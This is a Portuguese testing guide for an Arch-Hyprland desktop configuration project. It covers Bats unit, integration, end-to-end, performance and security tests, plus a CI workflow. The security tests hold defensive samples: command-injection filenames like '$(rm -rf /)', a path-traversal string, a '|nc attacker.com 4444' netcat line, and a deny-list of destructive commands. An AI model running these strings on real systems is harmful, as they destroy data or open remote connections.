# 🧪 Guia de Testes - Arch-Hyprland

Este documento detalha a estratégia de testes para garantir a qualidade e confiabilidade do projeto.

## 📋 Estratégia de Testes

### Pirâmide de Testes

```
                 /\
                /  \
               /    \
              / E2E  \     End-to-End Tests (Poucos, Lentos)
             /________\
            /          \
           /            \
          / Integration  \   Integration Tests (Alguns, Médios)
         /________________\
        /                \
       /                  \
      /    Unit Tests      \  Unit Tests (Muitos, Rápidos)
     /______________________\
```

### Tipos de Teste

1. **Unit Tests**: Funções individuais e componentes isolados
2. **Integration Tests**: Interação entre componentes
3. **End-to-End Tests**: Fluxos completos de usuário
4. **Performance Tests**: Benchmarks e métricas de performance
5. **Security Tests**: Testes de vulnerabilidades

## 🔧 Configuração do Ambiente de Testes

### Estrutura de Diretórios

```
tests/
├── unit/                    # Testes unitários
│   ├── scripts/            # Testes para scripts
│   ├── components/         # Testes para componentes
│   └── services/           # Testes para serviços
├── integration/            # Testes de integração
│   ├── waybar/            # Integração Waybar
│   ├── hyprland/          # Integração Hyprland
│   └── rofi/              # Integração Rofi
├── e2e/                   # Testes end-to-end
│   ├── scenarios/         # Cenários de teste
│   └── fixtures/          # Dados de teste
├── performance/           # Testes de performance
│   ├── benchmarks/        # Scripts de benchmark
│   └── stress/            # Testes de stress
├── security/              # Testes de segurança
│   ├── vulnerability/     # Testes de vulnerabilidade
│   └── penetration/       # Testes de penetração
├── fixtures/              # Dados de teste compartilhados
├── helpers/               # Funções auxiliares
└── tools/                 # Ferramentas de teste
```

### Dependências de Teste

```bash
# tests/setup/install-test-dependencies.sh
#!/bin/bash

install_test_dependencies() {
    # Bats - Framework de testes para Bash
    if ! command -v bats >/dev/null; then
        git clone https://github.com/bats-core/bats-core.git /tmp/bats-core
        cd /tmp/bats-core && sudo ./install.sh /usr/local
    fi

    # ShellCheck - Análise estática de scripts
    if ! command -v shellcheck >/dev/null; then
        sudo pacman -S --noconfirm shellcheck
    fi

    # Xvfb - Display virtual para testes GUI
    if ! command -v xvfb-run >/dev/null; then
        sudo pacman -S --noconfirm xorg-server-xvfb
    fi

    # Docker - Para testes de integração isolados
    if ! command -v docker >/dev/null; then
        sudo pacman -S --noconfirm docker
        sudo systemctl enable docker
    fi

    # Ferramentas de benchmark
    sudo pacman -S --noconfirm hyperfine time
}
```

## 🧪 Testes Unitários

### Framework de Testes

```bash
# tests/helpers/test-framework.sh
#!/bin/bash

# Carregamento automático do framework
load_test_framework() {
    export TEST_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
    export HYPR_CONFIG_ROOT="$TEST_ROOT/../"
    export FIXTURES_DIR="$TEST_ROOT/fixtures"
    export TEMP_TEST_DIR="/tmp/hyprland-test-$$"

    mkdir -p "$TEMP_TEST_DIR"

    # Mock para comandos externos durante testes
    export PATH="$TEST_ROOT/mocks:$PATH"
}

# Funções de assert customizadas
assert_file_exists() {
    local file="$1"
    [[ -f "$file" ]] || {
        echo "FAIL: File does not exist: $file"
        return 1
    }
}

assert_command_success() {
    local cmd="$1"
    if ! eval "$cmd" >/dev/null 2>&1; then
        echo "FAIL: Command failed: $cmd"
        return 1
    fi
}

assert_config_valid() {
    local config_file="$1"
    if ! validate_hypr_config "$config_file"; then
        echo "FAIL: Invalid config: $config_file"
        return 1
    fi
}

# Cleanup automático
teardown_test() {
    rm -rf "$TEMP_TEST_DIR"
}

trap teardown_test EXIT
```

### Testes para Scripts

```bash
# tests/unit/scripts/test_select_wallpaper.bats
#!/usr/bin/env bats

load '../helpers/test-framework'

setup() {
    load_test_framework

    # Setup mock wallpaper directory
    export WALLPAPER_DIR="$TEMP_TEST_DIR/wallpapers"
    mkdir -p "$WALLPAPER_DIR"

    # Create test wallpapers
    touch "$WALLPAPER_DIR/test1.jpg"
    touch "$WALLPAPER_DIR/test2.png"
    touch "$WALLPAPER_DIR/invalid;file.jpg"  # Para testar segurança
}

@test "should list valid wallpapers only" {
    source "$HYPR_CONFIG_ROOT/hypr/scripts/SelectWallpaper.sh"

    cd "$WALLPAPER_DIR"
    result=$(find . -maxdepth 1 -type f \( -iname "*.jpg" -o -iname "*.png" \) -printf "%f\n" | sort)

    [[ "$result" == *"test1.jpg"* ]]
    [[ "$result" == *"test2.png"* ]]
}

@test "should reject invalid filenames" {
    source "$HYPR_CONFIG_ROOT/hypr/scripts/SelectWallpaper.sh"

    # Teste de segurança - filename com caracteres perigosos
    if type validate_filename >/dev/null 2>&1; then
        ! validate_filename "invalid;file.jpg"
        ! validate_filename "../../../etc/passwd"
        ! validate_filename "\$(rm -rf /)"
    fi
}

@test "should update hyprpaper config correctly" {
    source "$HYPR_CONFIG_ROOT/hypr/scripts/SelectWallpaper.sh"

    # Mock hyprpaper.conf
    local config_file="$TEMP_TEST_DIR/hyprpaper.conf"
    cat > "$config_file" << EOF
preload = ~/old/wallpaper.jpg
wallpaper = ,~/old/wallpaper.jpg
EOF

    # Mock update function (simplified)
    update_hyprpaper_config() {
        local wallpaper="$1"
        sed -i "s#^preload = .*#preload = $wallpaper#" "$config_file"
        sed -i "s#^wallpaper = .*#wallpaper = ,$wallpaper#" "$config_file"
    }

    update_hyprpaper_config "~/new/wallpaper.png"

    grep -q "preload = ~/new/wallpaper.png" "$config_file"
    grep -q "wallpaper = ,~/new/wallpaper.png" "$config_file"
}
```

### Testes para Componentes

```bash
# tests/unit/components/test_waybar_component.bats
#!/usr/bin/env bats

load '../helpers/test-framework'

setup() {
    load_test_framework
    source "$HYPR_CONFIG_ROOT/components/waybar/waybar-component.sh"

    # Mock waybar config directory
    export waybar_config_dir="$TEMP_TEST_DIR/waybar"
    mkdir -p "$waybar_config_dir"
}

@test "waybar component should initialize correctly" {
    WaybarComponent::init

    assert_file_exists "$waybar_config_dir/config.jsonc"
    assert_file_exists "$waybar_config_dir/style.css"
}

@test "waybar component should validate config" {
    # Create valid config
    cat > "$waybar_config_dir/config.jsonc" << 'EOF'
{
    "layer": "top",
    "position": "top",
    "modules-left": ["hyprland/workspaces"],
    "modules-center": ["clock"],
    "modules-right": ["network"]
}
EOF

    assert_command_success "WaybarComponent::validate"
}

@test "waybar component should reject invalid config" {
    # Create invalid config
    cat > "$waybar_config_dir/config.jsonc" << 'EOF'
{
    "layer": "invalid",
    "position": "nowhere"
    // Missing closing brace
EOF

    ! WaybarComponent::validate
}
```

## 🔗 Testes de Integração

### Testes de Integração Hyprland-Waybar

```bash
# tests/integration/test_hyprland_waybar.bats
#!/usr/bin/env bats

load '../helpers/test-framework'

setup() {
    load_test_framework

    # Iniciar Xvfb para testes GUI
    export DISPLAY=:99
    Xvfb :99 -screen 0 1024x768x24 &
    export XVFB_PID=$!
    sleep 2
}

teardown() {
    kill $XVFB_PID 2>/dev/null || true
    teardown_test
}

@test "waybar should start with hyprland" {
    # Iniciar hyprland em background
    timeout 30 hyprland &
    local hyprland_pid=$!
    sleep 5

    # Verificar se waybar foi iniciado
    pgrep waybar || {
        echo "FAIL: Waybar not started with Hyprland"
        kill $hyprland_pid 2>/dev/null
        return 1
    }

    kill $hyprland_pid 2>/dev/null
}

@test "waybar should reflect workspace changes" {
    # Start minimal test environment
    timeout 30 hyprland &
    local hyprland_pid=$!
    sleep 5

    # Change workspace
    hyprctl dispatch workspace 2
    sleep 1

    # Verify waybar updated (check for workspace indicator)
    # Note: This would need waybar's JSON output or DOM inspection
    # For now, just verify waybar is responsive
    pgrep waybar

    kill $hyprland_pid 2>/dev/null
}
```

### Testes de Integração de Configuração

```bash
# tests/integration/test_config_integration.bats
#!/usr/bin/env bats

load '../helpers/test-framework'

setup() {
    load_test_framework

    # Create test config environment
    export TEST_CONFIG_DIR="$TEMP_TEST_DIR/config"
    mkdir -p "$TEST_CONFIG_DIR/hypr/UserConfigs"

    # Copy base configs
    cp -r "$HYPR_CONFIG_ROOT/hypr/UserConfigs"/* "$TEST_CONFIG_DIR/hypr/UserConfigs/"
}

@test "all user configs should be syntactically valid" {
    for config_file in "$TEST_CONFIG_DIR/hypr/UserConfigs"/*.conf; do
        assert_config_valid "$config_file"
    done
}

@test "config changes should not break system" {
    # Modify config
    echo "bind = SUPER, F1, exec, echo test" >> "$TEST_CONFIG_DIR/hypr/UserConfigs/UserKeybinds.conf"

    # Validate still works
    assert_config_valid "$TEST_CONFIG_DIR/hypr/UserConfigs/UserKeybinds.conf"
}

@test "all referenced scripts should exist" {
    # Extract script references from configs
    local script_refs=$(grep -r "exec.*Scripts" "$TEST_CONFIG_DIR/hypr/UserConfigs" | sed 's/.*Scripts\///' | cut -d' ' -f1)

    for script in $script_refs; do
        assert_file_exists "$HYPR_CONFIG_ROOT/hypr/scripts/$script"
    done
}
```

## 🎭 Testes End-to-End

### Cenários de Usuário

```bash
# tests/e2e/scenarios/test_complete_workflow.bats
#!/usr/bin/env bats

load '../helpers/test-framework'

setup() {
    load_test_framework

    # Setup complete test environment
    export DISPLAY=:99
    Xvfb :99 -screen 0 1920x1080x24 &
    export XVFB_PID=$!
    sleep 2

    # Copy complete config to test environment
    cp -r "$HYPR_CONFIG_ROOT" "$TEMP_TEST_DIR/test_install"
    cd "$TEMP_TEST_DIR/test_install"
}

teardown() {
    kill $XVFB_PID 2>/dev/null || true
    pkill -f "hyprland\|waybar\|rofi" 2>/dev/null || true
    teardown_test
}

@test "complete installation workflow" {
    # Simulate fresh installation
    export HOME="$TEMP_TEST_DIR/test_home"
    mkdir -p "$HOME"

    # Run install script
    timeout 300 bash install.sh

    # Verify installation
    assert_file_exists "$HOME/.config/hypr/hyprland.conf"
    assert_file_exists "$HOME/.config/waybar/config.jsonc"
    assert_file_exists "$HOME/.config/rofi/config.rasi"
}

@test "wallpaper selection workflow" {
    # Setup test wallpapers
    mkdir -p "$HOME/Imagens/wallpapers"
    cp "$FIXTURES_DIR/test-wallpaper.jpg" "$HOME/Imagens/wallpapers/"

    # Start hyprland
    timeout 60 hyprland &
    local hyprland_pid=$!
    sleep 10

    # Mock rofi selection (simulate user choosing wallpaper)
    export ROFI_MOCK_SELECTION="test-wallpaper.jpg"

    # Run wallpaper selection script
    timeout 30 bash hypr/scripts/SelectWallpaper.sh

    # Verify wallpaper was applied
    grep -q "test-wallpaper.jpg" "$HOME/.config/hypr/hyprpaper.conf"

    kill $hyprland_pid 2>/dev/null
}

@test "theme application workflow" {
    # Start environment
    timeout 60 hyprland &
    local hyprland_pid=$!
    sleep 10

    # Apply theme change
    if [[ -f "services/theme-engine/theme-engine.sh" ]]; then
        source "services/theme-engine/theme-engine.sh"
        ThemeEngine::load_theme "dark"

        # Verify theme applied to components
        # Check waybar restarted with new theme
        sleep 5
        pgrep waybar
    fi

    kill $hyprland_pid 2>/dev/null
}
```

## ⚡ Testes de Performance

### Benchmarks de Startup

```bash
# tests/performance/benchmarks/test_startup_performance.bats
#!/usr/bin/env bats

load '../helpers/test-framework'

setup() {
    load_test_framework
}

@test "startup time should be under 3 seconds" {
    local start_time=$(date +%s.%N)

    # Start Hyprland and measure time to waybar appearance
    export DISPLAY=:99
    Xvfb :99 -screen 0 1920x1080x24 &
    local xvfb_pid=$!
    sleep 2

    timeout 60 hyprland &
    local hyprland_pid=$!

    # Wait for waybar to appear
    local timeout=30
    while ! pgrep waybar >/dev/null && ((timeout-- > 0)); do
        sleep 0.1
    done

    local end_time=$(date +%s.%N)
    local duration=$(echo "$end_time - $start_time" | bc)

    kill $hyprland_pid $xvfb_pid 2>/dev/null || true

    # Assert startup time is reasonable
    (( $(echo "$duration < 3.0" | bc -l) ))
}

@test "memory usage should be under 200MB" {
    export DISPLAY=:99
    Xvfb :99 -screen 0 1920x1080x24 &
    local xvfb_pid=$!
    sleep 2

    timeout 60 hyprland &
    local hyprland_pid=$!
    sleep 10  # Allow full initialization

    # Measure memory usage
    local hyprland_mem=$(ps -p $hyprland_pid -o rss= 2>/dev/null || echo 0)
    local waybar_mem=$(pgrep waybar | xargs ps -p -o rss= 2>/dev/null | awk '{sum+=$1} END {print sum}')
    local total_mem=$((hyprland_mem + waybar_mem))

    kill $hyprland_pid $xvfb_pid 2>/dev/null || true

    # Assert total memory under 200MB (204800 KB)
    (( total_mem < 204800 ))
}
```

### Stress Tests

```bash
# tests/performance/stress/test_stress.sh
#!/bin/bash

stress_test_wallpaper_switching() {
    local iterations=100
    local wallpaper_dir="$TEMP_TEST_DIR/stress_wallpapers"

    # Create many test wallpapers
    mkdir -p "$wallpaper_dir"
    for i in $(seq 1 20); do
        cp "$FIXTURES_DIR/test-wallpaper.jpg" "$wallpaper_dir/wallpaper_$i.jpg"
    done

    export WALLPAPER_DIR="$wallpaper_dir"

    # Start hyprland
    export DISPLAY=:99
    Xvfb :99 -screen 0 1920x1080x24 &
    local xvfb_pid=$!
    sleep 2

    timeout 60 hyprland &
    local hyprland_pid=$!
    sleep 10

    # Stress test wallpaper switching
    for i in $(seq 1 $iterations); do
        local wallpaper="wallpaper_$((i % 20 + 1)).jpg"
        timeout 10 bash hypr/scripts/SelectWallpaper.sh "$wallpaper" || {
            echo "FAIL: Wallpaper switching failed at iteration $i"
            kill $hyprland_pid $xvfb_pid 2>/dev/null
            return 1
        }

        # Brief pause between switches
        sleep 0.1
    done

    kill $hyprland_pid $xvfb_pid 2>/dev/null
    echo "SUCCESS: Completed $iterations wallpaper switches"
}
```

## 🔒 Testes de Segurança

### Testes de Vulnerabilidade

```bash
# tests/security/vulnerability/test_input_validation.bats
#!/usr/bin/env bats

load '../helpers/test-framework'

setup() {
    load_test_framework
}

@test "script should reject malicious filenames" {
    source "$HYPR_CONFIG_ROOT/hypr/scripts/SelectWallpaper.sh"

    # Test various malicious inputs
    local malicious_inputs=(
        "'; rm -rf /tmp/test; echo 'pwned"
        "\$(rm -rf /tmp/test)"
        "../../../etc/passwd"
        "test\nrm -rf /"
        "|nc attacker.com 4444"
    )

    for input in "${malicious_inputs[@]}"; do
        if type validate_filename >/dev/null 2>&1; then
            ! validate_filename "$input" || {
                echo "FAIL: Malicious input accepted: $input"
                return 1
            }
        fi
    done
}

@test "config files should not contain dangerous commands" {
    local dangerous_commands=("rm -rf" "dd if=" "mkfs" "> /dev/")

    for config_file in "$HYPR_CONFIG_ROOT/hypr/UserConfigs"/*.conf; do
        for cmd in "${dangerous_commands[@]}"; do
            ! grep -q "$cmd" "$config_file" || {
                echo "FAIL: Dangerous command '$cmd' found in $config_file"
                return 1
            }
        done
    done
}

@test "scripts should have safe permissions" {
    find "$HYPR_CONFIG_ROOT/hypr/scripts" -name "*.sh" -type f | while read -r script; do
        local perms=$(stat -c %a "$script")

        # Should not be world-writable
        [[ "$perms" != *"7" ]] || {
            echo "FAIL: World-writable script: $script ($perms)"
            return 1
        }
    done
}
```

## 🤖 Automação de Testes

### GitHub Actions CI

```yaml
# .github/workflows/tests.yml
name: Tests

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]

jobs:
  unit-tests:
    runs-on: ubuntu-latest

    steps:
      - uses: actions/checkout@v3

      - name: Install dependencies
        run: |
          sudo apt-get update
          sudo apt-get install -y shellcheck bats

      - name: Run shellcheck
        run: |
          find . -name "*.sh" -type f -exec shellcheck {} +

      - name: Run unit tests
        run: |
          bats tests/unit/

      - name: Run integration tests
        run: |
          bats tests/integration/

  security-tests:
    runs-on: ubuntu-latest

    steps:
      - uses: actions/checkout@v3

      - name: Install security tools
        run: |
          sudo apt-get update
          sudo apt-get install -y bats

      - name: Run security tests
        run: |
          bats tests/security/

  performance-tests:
    runs-on: ubuntu-latest

    steps:
      - uses: actions/checkout@v3

      - name: Install performance tools
        run: |
          sudo apt-get update
          sudo apt-get install -y hyperfine bc

      - name: Run performance benchmarks
        run: |
          bash tests/performance/run_benchmarks.sh
```

### Script de Execução de Testes

```bash
# tests/run_tests.sh
#!/bin/bash

# Script para executar todos os testes localmente

set -e

# Cores para output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

print_status() {
    echo -e "${GREEN}[INFO]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[WARN]${NC} $1"
}

print_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

# Verificar dependências
check_dependencies() {
    local missing_deps=()

    command -v bats >/dev/null || missing_deps+=("bats")
    command -v shellcheck >/dev/null || missing_deps+=("shellcheck")

    if [[ ${#missing_deps[@]} -gt 0 ]]; then
        print_error "Missing dependencies: ${missing_deps[*]}"
        print_status "Run: bash tests/setup/install-test-dependencies.sh"
        exit 1
    fi
}

# Executar testes por categoria
run_unit_tests() {
    print_status "Running unit tests..."
    if bats tests/unit/; then
        print_status "Unit tests passed ✓"
    else
        print_error "Unit tests failed ✗"
        return 1
    fi
}

run_integration_tests() {
    print_status "Running integration tests..."
    if bats tests/integration/; then
        print_status "Integration tests passed ✓"
    else
        print_error "Integration tests failed ✗"
        return 1
    fi
}

run_security_tests() {
    print_status "Running security tests..."
    if bats tests/security/; then
        print_status "Security tests passed ✓"
    else
        print_error "Security tests failed ✗"
        return 1
    fi
}

run_performance_tests() {
    print_status "Running performance tests..."
    if bash tests/performance/run_benchmarks.sh; then
        print_status "Performance tests passed ✓"
    else
        print_warning "Performance tests completed with warnings"
    fi
}

run_shellcheck() {
    print_status "Running ShellCheck analysis..."
    if find . -name "*.sh" -type f -exec shellcheck {} +; then
        print_status "ShellCheck analysis passed ✓"
    else
        print_error "ShellCheck analysis found issues ✗"
        return 1
    fi
}

# Main execution
main() {
    local test_type="${1:-all}"

    check_dependencies

    case "$test_type" in
        "unit")
            run_unit_tests
            ;;
        "integration")
            run_integration_tests
            ;;
        "security")
            run_security_tests
            ;;
        "performance")
            run_performance_tests
            ;;
        "shellcheck")
            run_shellcheck
            ;;
        "all")
            run_shellcheck && \
            run_unit_tests && \
            run_integration_tests && \
            run_security_tests && \
            run_performance_tests
            ;;
        *)
            echo "Usage: $0 [unit|integration|security|performance|shellcheck|all]"
            exit 1
            ;;
    esac

    if [[ $? -eq 0 ]]; then
        print_status "All selected tests completed successfully! 🎉"
    else
        print_error "Some tests failed. Please review the output above."
        exit 1
    fi
}

main "$@"
```

## 📊 Relatórios de Teste

### Geração de Relatórios

```bash
# tests/tools/generate_test_report.sh
#!/bin/bash

generate_test_report() {
    local output_file="${1:-test_report.html}"
    local test_results_dir="test_results"

    mkdir -p "$test_results_dir"

    # Executar testes e capturar resultados
    bats --formatter tap tests/unit/ > "$test_results_dir/unit_results.tap"
    bats --formatter tap tests/integration/ > "$test_results_dir/integration_results.tap"
    bats --formatter tap tests/security/ > "$test_results_dir/security_results.tap"

    # Gerar relatório HTML
    cat > "$output_file" << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>Arch-Hyprland Test Report</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .pass { color: green; }
        .fail { color: red; }
        .summary { background: #f5f5f5; padding: 10px; margin: 10px 0; }
        .test-section { margin: 20px 0; }
    </style>
</head>
<body>
    <h1>Arch-Hyprland Test Report</h1>
    <div class="summary">
        <h2>Test Summary</h2>
        <div id="summary-content"></div>
    </div>

    <div class="test-section">
        <h2>Unit Tests</h2>
        <div id="unit-tests"></div>
    </div>

    <div class="test-section">
        <h2>Integration Tests</h2>
        <div id="integration-tests"></div>
    </div>

    <div class="test-section">
        <h2>Security Tests</h2>
        <div id="security-tests"></div>
    </div>

    <script>
        // Parse TAP results and populate report
        // Implementation would parse the .tap files and generate HTML
    </script>
</body>
</html>
EOF

    echo "Test report generated: $output_file"
}
```

---

_Este sistema de testes garante a qualidade e confiabilidade do projeto em todos os níveis, desde funções individuais até fluxos completos de usuário._
